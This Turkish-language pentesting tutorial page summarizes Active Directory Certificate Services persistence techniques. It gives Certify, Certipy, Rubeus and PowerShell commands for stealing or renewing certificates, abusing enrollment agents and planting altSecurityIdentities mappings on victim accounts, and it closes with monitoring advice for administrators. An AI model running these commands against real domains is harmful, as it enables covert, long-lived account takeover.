# AD CS Hesap Kalıcılığı

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresindeki muhteşem araştırmanın hesap kalıcılığı bölümlerinin kısa bir özetidir**

## Sertifikalarla Aktif Kullanıcı Kimlik Bilgisi Hırsızlığını Anlamak – PERSIST1

Bir kullanıcının domain kimlik doğrulamasına izin veren bir sertifikayı talep edebildiği bir senaryoda, bir saldırgan bu sertifikayı talep edip çalarak bir ağda kalıcılık sağlayabilir. Varsayılan olarak Active Directory'deki `User` template'i bu tür taleplere izin verir, ancak bazen devre dışı bırakılmış olabilir.

[Certify](https://github.com/GhostPack/Certify) veya [Certipy](https://github.com/ly4k/Certipy) kullanarak, istemci kimlik doğrulamasına izin veren etkin template'leri arayıp ardından birini talep edebilirsiniz:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Bir sertifikanın gücü, sertifika geçerli olduğu sürece, parola değişikliklerine bakılmaksızın ait olduğu kullanıcı olarak kimlik doğrulaması yapabilmesindedir.

PEM'i PFX'e dönüştürebilir ve bunu bir TGT almak için kullanabilirsiniz:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Not: Diğer tekniklerle birleştirildiğinde (THEFT bölümlerine bakın), sertifika tabanlı kimlik doğrulama LSASS'e dokunmadan ve hatta yükseltilmemiş bağlamlardan kalıcı erişim sağlar.

## Sertifikalarla Makine Kalıcılığı Sağlama - PERSIST2

Eğer bir saldırganın bir host üzerinde yükseltilmiş ayrıcalıkları varsa, varsayılan `Machine` template'ini kullanarak ele geçirilmiş sistemin makine hesabı için bir sertifika kaydı yapabilir. Makine olarak kimlik doğrulama, yerel hizmetler için S4U2Self'i etkinleştirir ve kalıcı host erişimi sağlayabilir:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Sertifika Yenileme ile Kalıcılığı Uzatma - PERSIST3

Sertifika şablonlarının geçerlilik ve yenileme sürelerini kötüye kullanmak, saldırganın uzun süreli erişim sağlamasına olanak verir. Daha önce verilmiş bir sertifika ve onun özel anahtarına sahipseniz, süresi dolmadan önce onu yenileyerek orijinal kimliğe bağlı ek istek artefaktları bırakmadan taze, uzun ömürlü bir kimlik bilgisi elde edebilirsiniz.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasyonel ipucu: Saldırganın elindeki PFX dosyalarının ömürlerini takip edin ve erken yenileyin. Yenileme, güncellenmiş sertifikelere modern SID eşleme uzantısının eklenmesine neden olabilir; bu da daha sıkı DC eşleme kuralları altında bunların kullanılabilir kalmasını sağlar (bir sonraki bölüme bakın).

## Açık Sertifika Eşlemelerini Yerleştirme (altSecurityIdentities) – PERSIST4

Eğer hedef hesabın `altSecurityIdentities` özniteliğine yazabiliyorsanız, saldırgan tarafından kontrol edilen bir sertifikayı o hesaba açıkça eşleyebilirsiniz. Bu, parola değişiklikleri boyunca kalıcıdır ve güçlü eşleme formatları kullanıldığında modern DC zorlaması altında da çalışmaya devam eder.

Yüksek düzey akış:

1. Kontrol ettiğiniz bir client-auth sertifikası edinin veya çıkarın (ör. kendiniz için `User` şablonunu enroll edin).
2. Sertifikadan güçlü bir tanımlayıcı çıkarın (Issuer+Serial, SKI veya SHA1-PublicKey).
3. Bu tanımlayıcıyı kullanarak hedef principal’ın `altSecurityIdentities` öznitelğine açık bir eşleme ekleyin.
4. Sertifikanızla kimlik doğrulaması yapın; DC bunu açık eşleme aracılığıyla hedefe eşler.

Örnek (PowerShell) güçlü bir Issuer+Serial eşlemesi kullanılarak:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Ardından PFX'inizle kimlik doğrulayın. Certipy doğrudan bir TGT alacaktır:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Güçlü `altSecurityIdentities` Eşlemeleri Oluşturma

Pratikte, **Issuer+Serial** ve **SKI** eşlemeleri, bir saldırganın elindeki sertifikadan oluşturulabilecek en kolay güçlü formatlardır. Bu, **11 Şubat 2025**'ten sonra önem kazanır; çünkü DCs varsayılan olarak **Full Enforcement**'a geçecek ve zayıf eşlemeler güvenilir olmaktan çıkacaktır.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notlar
- Sadece güçlü eşleme türlerini kullanın: `X509IssuerSerialNumber`, `X509SKI`, veya `X509SHA1PublicKey`. Zayıf formatlar (Subject/Issuer, Subject-only, RFC822 email) kullanımdan kaldırılmıştır ve DC politikası tarafından engellenebilir.
- Eşleme hem **kullanıcı** hem de **bilgisayar** nesnelerinde çalışır; bu nedenle bir bilgisayar hesabının `altSecurityIdentities` özniteliğine yazma erişimi, o makine olarak kalıcı olmak için yeterlidir.
- Sertifika zinciri DC tarafından güvenilen bir köke kadar inmelidir. NTAuth içindeki Enterprise CA'lar genellikle güvenilir kabul edilir; bazı ortamlarda public CA'lar da güvenilir kabul edilir.
- Schannel authentication, DC Smart Card Logon EKU'suna sahip olmadığı veya `KDC_ERR_PADATA_TYPE_NOSUPP` döndürdüğü için PKINIT başarısız olsa bile kalıcılık için faydalı olmaya devam eder.

Zayıf açık eşlemeler ve saldırı yolları hakkında daha fazla bilgi için bkz:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent olarak Kalıcılık – PERSIST5

Geçerli bir Certificate Request Agent/Enrollment Agent sertifikası elde ederseniz, istediğiniz zaman kullanıcılar adına yeni oturum açma yeteneği olan sertifikalar üretebilir ve ajan PFX'ini kalıcılık belirteci olarak çevrimdışı tutabilirsiniz. Suistimal iş akışı:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Bu persistence'i kaldırmak için agent sertifikasının veya şablon izinlerinin iptal edilmesi gerekir.

Operasyonel notlar
- Modern `Certipy` sürümleri hem `-on-behalf-of` hem de `-renew`'i destekler; bu sayede Enrollment Agent PFX'e sahip bir saldırgan, hedef hesabı tekrar ellemeye gerek kalmadan leaf certificates oluşturup daha sonra yenileyebilir.
- Eğer PKINIT tabanlı TGT elde etme mümkün değilse, ortaya çıkan on-behalf-of sertifikası yine de Schannel kimlik doğrulaması için kullanılabilir: `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Persistence Üzerindeki Etkisi

Microsoft KB5014754, domain controller'larda Strong Certificate Mapping Enforcement'ı tanıttı. 11 Şubat 2025'ten itibaren DC'ler varsayılan olarak Full Enforcement modunda çalışıyor ve zayıf/belirsiz eşlemeleri reddediyor. Pratik etkiler:

- 2022 öncesi sertifikalar SID mapping extension'ı içermiyorsa, DC'ler Full Enforcement modundaysa implicit mapping başarısız olabilir. Saldırganlar erişimi sürdürmek için sertifikaları AD CS üzerinden yenileyerek (SID mapping extension almak için) veya `altSecurityIdentities` içine güçlü bir explicit mapping yerleştirerek (PERSIST4) bunu başarabilirler.
- Issuer+Serial, SKI, SHA1-PublicKey gibi güçlü formatları kullanan explicit mapping'ler çalışmaya devam eder. Issuer/Subject, Subject-only, RFC822 gibi zayıf formatlar engellenebilir ve persistence için kaçınılmalıdır.

Yöneticiler şunları izlemeli ve uyarı vermelidir:
- `altSecurityIdentities`'deki değişiklikler ve Enrollment Agent ile User sertifikalarının verilmesi/yenilenmesi.
- CA issuance logları üzerinde on-behalf-of talepleri ve sıra dışı yenileme desenleri.

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
